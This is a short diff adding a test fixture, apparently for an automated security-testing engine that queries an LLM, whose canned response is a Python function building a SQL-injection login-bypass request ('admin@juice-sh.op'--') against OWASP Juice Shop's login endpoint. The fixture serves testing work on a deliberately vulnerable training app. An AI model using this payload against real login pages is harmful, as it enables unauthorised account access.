@@ -1,0 +1,17 @@
+```python
+def trigger_sqli_login_bypass(target_url: str, email_payload: str = "admin@juice-sh.op'--") -> dict:
+    """Refined PTF — same shape as v1 (no functional change needed; the
+    initial PTF passes the testcase on first attempt for this target)."""
+    import json
+    return {
+        "method": "POST",
+        "url": f"{target_url.rstrip('/')}/rest/user/login",
+        "headers": {"Content-Type": "application/json"},
+        "body": json.dumps({"email": email_payload, "password": "anything"}),
+    }
+```
+
+Note: this refinement path is rarely entered for the Juice Shop SQLi
+case — the initial PTF generation already produces a passing testcase.
+This file exists so the fixture covers all 12 LLM purposes the engine
+might invoke (defense in depth).
